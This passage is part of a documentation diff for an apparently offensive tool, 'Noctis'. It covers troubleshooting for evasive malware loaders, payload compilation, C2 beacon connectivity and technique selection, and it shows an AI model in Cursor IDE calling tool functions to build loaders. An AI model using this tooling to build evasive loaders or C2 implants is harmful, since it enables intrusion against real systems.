+3. Verify server running: `python server/noctis_server.py --port 8888`
+
+### Issue: Low OPSEC Score
+
+**Fix**:
+```python
+# Add more evasion techniques
+result = develop(
+    goal="Loader",
+    techniques=["NOCTIS-T124", "NOCTIS-T118", "NOCTIS-T201"],
+    complexity="high"
+)
+```
+
+### Issue: Compilation Fails
+
+**Fix**:
+1. Check MinGW-w64 installed (Linux) or MSVC (Windows)
+2. Verify source code syntax
+3. Check logs in `logs/compiler.log`
+
+### Issue: C2 Beacon Won't Connect
+
+**Fix**:
+1. Verify listener running: `c2_list()`
+2. Check firewall rules
+3. Test connectivity: `telnet c2.example.com 443`
+4. Verify beacon configuration
+
+### Issue: Technique Incompatibility Error
+
+**Fix**:
+Let `develop()` choose techniques automatically instead of forcing specific ones:
+
+```python
+# Instead of this (may conflict)
+develop(techniques=["NOCTIS-T124", "NOCTIS-T126"])  # Both syscall methods
+
+# Do this (automatic selection)
+develop(goal="Syscall-based loader")
+```
+
+---
+
+## Getting Help
+
+### In Cursor IDE
+
+```
+User: "How do I create a loader?"
+Assistant: [calls help() or develop() automatically]
+```
+
+### Documentation
+
+- [MCP_TOOLS_REFERENCE.md](MCP_TOOLS_REFERENCE.md) - Detailed tool reference
+- [ARCHITECTURE.md](ARCHITECTURE.md) - Technical architecture
+- [C2_INTEGRATION.md](C2_INTEGRATION.md) - C2 framework setup
+- [API_REFERENCE.md](API_REFERENCE.md) - REST API endpoints
+
+### Community
+
+- GitHub Issues: Report bugs
+- Discussions: Ask questions
+
+---
+
+**Last Updated**: October 4, 2025
+**Version**: 2.0.0
